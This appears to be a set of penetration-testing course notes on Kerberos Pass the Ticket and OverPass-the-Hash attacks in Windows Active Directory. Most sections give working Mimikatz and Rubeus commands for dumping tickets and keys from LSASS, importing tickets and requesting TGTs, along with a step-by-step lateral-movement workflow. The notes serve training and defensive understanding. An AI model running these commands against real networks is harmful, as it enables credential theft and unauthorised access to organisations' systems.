# Pass the Ticket (PtT) from Windows

## Core Concept

Pass the Ticket uses a stolen Kerberos ticket instead of an NTLM hash or plaintext password.

```text id="l9scxv"
Stolen TGT/TGS
      ↓
Import into logon session
      ↓
Kerberos authentication
      ↓
Access authorized services
```

---

# 1. Kerberos

Simplified:

```text id="wtm4d1"
User
  ↓
KDC / Domain Controller
  ↓
TGT
  ↓
KDC
  ↓
TGS / service ticket
  ↓
Target service
```

### KDC

Key Distribution Center.

In AD, the Domain Controller provides the KDC.

---

# 2. TGT

Ticket Granting Ticket.

Purpose:

```text id="v6uzw5"
Authenticate to the domain
and request service tickets.
```

Typical service name:

```text id="dd1pmr"
krbtgt/domain
```

Think:

```text id="8l6mro"
krbtgt → TGT
```

---

# 3. TGS / Service Ticket

Purpose:

```text id="fl0ixr"
Authenticate to a specific service.
```

Examples:

```text id="t0v5z8"
cifs/DC01.domain
LDAP/DC01.domain
HTTP/web01.domain
MSSQLSvc/db01.domain
```

A TGS is generally service-specific.

---

# 4. PtH vs PtT vs OverPass

```text id="hqdx8g"
Pass the Hash
    NT hash
      ↓
    NTLM
      ↓
    access
```

```text id="zjmj3m"
Pass the Ticket
    TGT/TGS
      ↓
   Kerberos
      ↓
    access
```

```text id="nhd5zj"
OverPass-the-Hash
    NT hash / Kerberos key
      ↓
  request Kerberos TGT
      ↓
    Kerberos
```

### Remember

```text id="mofkko"
PtH  = HASH → NTLM
PtT  = TICKET → Kerberos
OPtH = HASH/KEY → TGT → Kerberos
```

---

# 5. Harvest Kerberos Tickets

Windows stores/handles Kerberos credential material through LSASS.

Administrator-level access can allow collection of tickets from other logon sessions.

### Mimikatz

```text id="gx9tzk"
mimikatz
privilege::debug
sekurlsa::tickets /export
```

Exported tickets:

```text id="lh9dz5"
*.kirbi
```

Useful interpretation:

```text id="9eyy4p"
krbtgt
    → TGT

cifs/...
    → CIFS/SMB service ticket

ldap/...
    → LDAP service ticket
```

---

# 6. Rubeus Ticket Dump

```cmd id="pry00l"
Rubeus.exe dump /nowrap
```

Useful fields:

```text id="a6vl8p"
ServiceName
UserName
StartTime
EndTime
RenewTill
KeyType
Base64EncodedTicket
```

Important:

```text id="7up0ht"
EndTime
    → ticket expiration
```

Do not assume stolen tickets are valid forever.

---

# 7. Computer Accounts

AD computer accounts conventionally end with:

```text id="8rd1gp"
$
```

Examples:

```text id="c8c2q5"
DC01$
MS01$
WEB01$
```

This indicates a computer account rather than a normal human user.

---

# 8. Pass the Ticket — Rubeus

Import `.kirbi`:

```cmd id="c1c4oa"
Rubeus.exe ptt /ticket:<ticket.kirbi>
```

Success:

```text id="skz1lw"
[+] ticket successfully imported!
```

Concept:

```text id="wzvc4z"
.kirbi
 ↓
Rubeus ptt
 ↓
current logon session
 ↓
ticket available to Windows
```

---

# 9. Pass the Ticket — Mimikatz

```text id="8y0k38"
mimikatz
privilege::debug
kerberos::ptt "C:\path\ticket.kirbi"
```

Concept:

```text id="7a0fqe"
existing ticket
    ↓
kerberos::ptt
    ↓
current logon session
```

---

# 10. Verify Ticket State

On Windows:

```cmd id="jmy2aj"
klist
```

Useful for checking tickets in the current logon session.

Look for:

```text id="m8lk1v"
krbtgt
cifs
ldap
http
other SPNs
```

---

# 11. Access a Service

Example SMB access:

```cmd id="izdu22"
dir \\DC01.inlanefreight.htb\c$
```

The important idea is:

```text id="h1i0qe"
Imported Kerberos ticket
        ↓
Windows Kerberos authentication
        ↓
Service access
```

The account still needs authorization to the target resource.

---

# 12. Extract Kerberos Keys

Mimikatz:

```text id="b1rw5f"
mimikatz
privilege::debug
sekurlsa::ekeys
```

May show:

```text id="j5b8c7"
aes256_hmac
aes128_hmac
rc4_hmac_nt
```

These are Kerberos-related long-term key types associated with logon credentials.

---

# 13. OverPass-the-Hash / Pass the Key

Concept:

```text id="pqg62r"
NT hash / Kerberos key
       ↓
Kerberos AS-REQ
       ↓
KDC
       ↓
TGT
```

Different from PtH:

```text id="bzp47u"
PtH:
hash → NTLM

OverPass:
hash/key → Kerberos TGT
```

---

# 14. Rubeus `asktgt`

Using AES-256:

```cmd id="qysl5d"
Rubeus.exe asktgt ^
    /domain:<DOMAIN> ^
    /user:<USER> ^
    /aes256:<AES256_KEY> ^
    /nowrap
```

Using RC4/NT hash where supported:

```cmd id="d11yq2"
Rubeus.exe asktgt ^
    /domain:<DOMAIN> ^
    /user:<USER> ^
    /rc4:<NT_HASH> ^
    /nowrap
```

Concept:

```text id="uv2jlm"
account + Kerberos key
      ↓
build AS-REQ
      ↓
KDC
      ↓
TGT
```

---

# 15. Request + Import TGT

Rubeus:

```cmd id="jw7n6h"
Rubeus.exe asktgt ^
    /domain:<DOMAIN> ^
    /user:<USER> ^
    /aes256:<AES256_KEY> ^
    /ptt
```

Concept:

```text id="w3jvbt"
asktgt
  ↓
TGT obtained
  ↓
/ptt
  ↓
ticket automatically imported
```

Success message:

```text id="0y6sxf"
[+] Ticket successfully imported!
```

---

# 16. AES vs RC4

Modern AD environments generally prefer AES for Kerberos.

Available key material may include:

```text id="hs8y5p"
AES256
AES128
RC4
```

Using RC4 in circumstances where AES would normally be expected can create an observable encryption-type anomaly/downgrade signal.

Therefore:

```text id="j6ox7l"
RC4 works
    ≠
RC4 is automatically stealthy
```

---

# 17. PowerShell Remoting

PowerShell Remoting:

```text id="639qsz"
TCP/5985 → HTTP
TCP/5986 → HTTPS
```

Potential authorization:

```text id="ssujqu"
Administrator
Remote Management Users
explicit remoting permissions
```

After importing an appropriate ticket:

```powershell id="sdq17r"
Enter-PSSession -ComputerName DC01
```

Verify:

```powershell id="krm3ii"
whoami
hostname
```

Concept:

```text id="u3xukw"
Ticket
 ↓
Kerberos
 ↓
WinRM
 ↓
PowerShell Remoting
```

---

# 18. Rubeus `createnetonly`

Create a sacrificial network-only logon process:

```cmd id="g8whn9"
Rubeus.exe createnetonly ^
    /program:"C:\Windows\System32\cmd.exe" ^
    /show
```

Creates:

```text id="c2ycib"
Logon Type 9
```

Purpose:

```text id="0xkymc"
Keep current authentication state
separate from the ticket-based operation.
```

Mental model:

```text id="4s1o0y"
Main session
    ↓
keep existing tickets

Sacrificial process
    ↓
use imported/new ticket
```

---

# 19. Ticket Lifetime

Always check:

```text id="ylwcmd"
StartTime
EndTime
RenewTill
```

A stolen ticket may become unusable because it:

```text id="sm1b6g"
expired
```

or because:

```text id="s5mx8s"
wrong service
wrong account
insufficient authorization
```

---

# 20. Ticket Scope

TGT:

```text id="y7yih4"
krbtgt/domain
    ↓
request service tickets
```

TGS:

```text id="9a4q2z"
cifs/server
    ↓
specific service
```

Don't treat a TGS as a universal credential.

---

# 21. PtT Workflow

```text id="0yid40"
Compromise Windows host
        ↓
Obtain privileged access
        ↓
Harvest Kerberos tickets
        ↓
Identify TGT/TGS
        ↓
Check service + validity
        ↓
Export / obtain .kirbi
        ↓
Import using Rubeus/Mimikatz
        ↓
Authenticate to authorized service
        ↓
Lateral movement
```

---

# 22. OverPass Workflow

```text id="8b7qj8"
Compromise host
        ↓
Obtain NT hash / Kerberos key
        ↓
Identify user/domain
        ↓
Request TGT with Rubeus
        ↓
/ptt
        ↓
TGT imported
        ↓
Request/access Kerberos services
```

---

# 23. Tool Recognition

```text id="u5ud6x"
Mimikatz
    sekurlsa::tickets /export
        → export tickets

Mimikatz
    kerberos::ptt
        → import ticket

Mimikatz
    sekurlsa::ekeys
        → extract Kerberos keys

Rubeus
    dump
        → dump tickets

Rubeus
    ptt
        → import ticket

Rubeus
    asktgt
        → request TGT

Rubeus
    /ptt
        → automatically import obtained ticket

Rubeus
    createnetonly
        → sacrificial Logon Type 9 process

klist
        → inspect current Kerberos ticket cache
```

---

# 24. Most Important Distinction

```text id="a3njw1"
I HAVE AN NT HASH
        │
        ├── Want NTLM authentication
        │       ↓
        │      PtH
        │
        └── Want Kerberos TGT
                ↓
          OverPass-the-Hash
```

```text id="q64w1c"
I ALREADY HAVE A KERBEROS TICKET
        ↓
       PtT
```

---

# Golden Rules

```text id="vnw7fw"
1. TGT = used to obtain service tickets.
2. TGS = service-specific Kerberos ticket.
3. PtT uses an existing Kerberos ticket.
4. PtH uses an NTLM hash.
5. OverPass-the-Hash uses a hash/key to obtain a Kerberos TGT.
6. krbtgt/domain usually indicates a TGT.
7. cifs/server, LDAP/server, HTTP/server, etc. indicate service tickets.
8. .kirbi is a common Windows Kerberos ticket file format used by these tools.
9. Check ticket expiration and service scope.
10. Authentication does not automatically imply authorization.
11. AES is generally preferred over RC4 in modern AD Kerberos.
12. Rubeus createnetonly creates a separate network-only logon context for ticket operations.
```
